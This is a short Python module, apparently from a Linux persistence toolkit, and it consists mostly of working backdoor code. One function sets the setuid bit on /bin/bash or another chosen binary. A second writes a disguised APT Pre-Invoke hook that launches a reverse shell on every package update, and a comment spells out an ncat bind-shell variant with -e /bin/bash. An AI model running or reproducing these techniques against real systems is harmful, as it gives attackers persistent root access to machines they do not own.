import os
from colors import *
import util
import reverse

def setuid():
    pInfo("Write 0 in any input to exit the current tool.")
    binary = input("Which binary do you want to modify?(default /bin/bash) ")
    if binary == '':
        binary = '/bin/bash'
    if os.path.isfile(binary):
        os.system(f'chmod u+s {binary}')
    else:
        pError(f"Path {binary} does not exist.")
        return

#echo 'APT::Update::Pre-Invoke {"nohup ncat -lvp 1234 -e /bin/bash 2> /dev/null &"};'
#> /etc/apt/apt.conf.d/42backdoor
def backApt():
    with open('/etc/apt/apt.conf.d/42appdate','a') as file:
        code = reverse.reverse(False)
        file.write(f'APT::Update::Pre-Invoke {{"{code}"}};')
